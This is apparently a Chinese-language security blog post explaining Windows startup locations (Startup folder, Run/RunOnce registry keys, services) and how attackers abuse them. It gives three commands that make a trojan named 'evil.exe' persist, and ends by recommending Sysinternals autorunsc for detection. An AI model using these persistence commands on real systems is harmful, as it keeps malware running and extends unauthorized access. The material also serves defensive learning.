<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xfXGDGdzr8kKbAygeo3G4w)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

简介

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

在我们的计算机开机的时候，总是会有一些程序和服务自动启动，这其中包括 Windows 操作系统运行所必需的程序和其他用户程序。这是操作系统给用户提供的功能，意在为用户开机启动程序提供方便，我们不必每次启动时都手动的打开一些必须打开的程序。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

常见开机启动项  

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

1.   启动文件夹：您可以通过开始菜单 > 右键点击开始 > 选择运行（就是前文所说的 Win+R）> 输入 shell:startup 访问当前用户的启动文件夹。有些程序的快捷方式会放在这里，使其在开机时自动运行。
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BwDxIZUN9iaHME8KCsX3NAN6tibLRJSWhTHkBb0TEOuKBjC9K2uZR3noYibZpIXeWUTIYALVjamAofw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BwDxIZUN9iaHME8KCsX3NANepobZfiaPq3NicGyrVibRjkRXGTj05UMbpIqUSicicHKE47ibTO2lKibibZfGA/640?wx_fmt=png)

2. 任务管理器的启动选项：按`Ctrl + Shift + Esc`键打开`任务管理器`，然后点击顶部的`启动`标签。这将列出所有设置为在启动时运行的应用程序。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BwDxIZUN9iaHME8KCsX3NANTGbFBxhSDMEsShN1259Ju1wNrc32IxlfWycibgMLbURqv2pz7VQLmcw/640?wx_fmt=png)

3. 系统配置（msconfig）：在`运行`对话框输入`msconfig`然后点击`确定`，打开`系统配置`窗口。点击上方的`启动`和`服务`标签会列出更多的启动项。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BwDxIZUN9iaHME8KCsX3NANzuK8w46wG5XLDJg8MwSlM4JI5PChMkL3kiaE2OxHWfibFuf3yt2CGRHA/640?wx_fmt=png)

4. 注册表：在运行对话框中输入 regedit，然后点击确定，打开注册表编辑器。启动项主要保存在两个地方：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run、HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run。在这两个路径下的项都会在开机时运行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BwDxIZUN9iaHME8KCsX3NAND0PUNl6l9tK41WHgoq7SiaBoEAIucfesyNsbibOiaBic9edkOwLo3Osxfg/640?wx_fmt=png)

实际上影响开机启动的注册表很多，这里列出四个主要的：

*   HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    
*   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    
*   HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
    
*   HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    

5. 服务：在运行框中输入 services.msc 并按回车键。这会打开服务窗口，显示所有服务，包括在启动时运行的服务。请注意，有些服务是必需的，禁用它们可能会影响系统的运行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9BwDxIZUN9iaHME8KCsX3NANNDhE55bPuQGOSffHFrZJxiaMUMpM3UWSmhed8bBx3qDbanoAGT1NqaA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

利用方式

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

1.   复制木马文件至启动文件夹:
    

```
copy "C:\Program Files\folder\evil.exe" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

```

2. 修改注册表项，加入木马文件：

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyProgram /t REG_SZ /d "\"C:\Program Files\folder\evil.exe\""

```

3. 创建一个系统服务，设置为自启动：

```
sc create MyService binPath= "\"C:\Program Files\folder\evil.exe\"" start= auto

```

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

防范  

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

使用微软官方神器 Sysinternals Suite 中的 autorunsc64.exe 来自动检查所有的启动项，后续考虑出一个入侵防御专栏讲解。